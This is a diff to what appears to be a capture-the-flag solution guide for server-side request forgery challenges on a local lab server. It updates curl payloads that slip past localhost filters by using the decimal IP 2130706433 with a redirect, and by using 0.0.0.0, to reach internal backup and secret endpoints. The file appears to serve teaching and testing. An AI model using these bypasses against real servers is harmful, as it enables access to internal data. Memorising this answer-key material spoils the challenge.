@@ -75,11 +75,12 @@ Flag: FLAG{ssrf_r3d1r3ct_byp4ss}
   that sends a 302 redirect.
 
   curl -X POST http://localhost:5008/fetch-redirect \
-    -d "url=http://localhost:5008/redirect-to?url=http://127.0.0.1:5008/internal/db-backup"
+    -d "url=http://2130706433:5008/redirect-to?url=http://2130706433:5008/internal/db-backup"
 
-  The initial URL passes the filter (or use an external URL that
-  redirects to localhost). The 302 redirect leads to the internal
-  endpoint, bypassing the filter.
+  NOTE: The filter checks the entire URL string for "localhost" and
+  "127.0.0.1", including query parameters. Use decimal IP (2130706433)
+  throughout the URL to bypass the string check. The server follows
+  the 302 redirect to the internal endpoint.
 
 -------------------------------------------------------------------------------
 
@@ -92,7 +93,7 @@ Flag: FLAG{ssrf_dns_r3b1nd}
   Easiest bypass: use 0.0.0.0 which maps to localhost on most systems
   but doesn't fall in the 127.x.x.x range:
 
-  curl "http://localhost:5008/fetch-dns?url=http://0.0.0.0:5008/internal/flag"
+  curl "http://localhost:5008/fetch-dns?url=http://0.0.0.0:5008/internal/dns-secret"
 
   For a true DNS rebinding attack, you'd need a DNS server that
   returns a public IP on the first query and 127.0.0.1 on the second.
